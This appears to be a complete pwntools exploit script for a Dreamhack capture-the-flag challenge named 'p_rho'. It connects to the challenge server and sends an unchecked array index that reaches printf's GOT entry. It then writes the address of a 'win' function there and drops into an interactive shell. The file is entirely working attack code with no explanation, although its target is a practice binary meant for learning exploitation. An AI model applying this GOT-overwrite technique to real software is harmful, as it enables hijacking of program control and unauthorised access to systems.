from pwn import *

port = 17339
rem = remote("host3.dreamhack.games", port)

elf = ELF("./Pwnable/p_rho/problem/deploy/prob")

buf_addr = elf.symbols['buf']
printf_got = elf.got['printf']
win_addr = elf.symbols['win']

rem.sendlineafter(b"val: ", str((printf_got - buf_addr) // 8).encode())
rem.sendlineafter(b"val: ", str(win_addr).encode())

rem.interactive()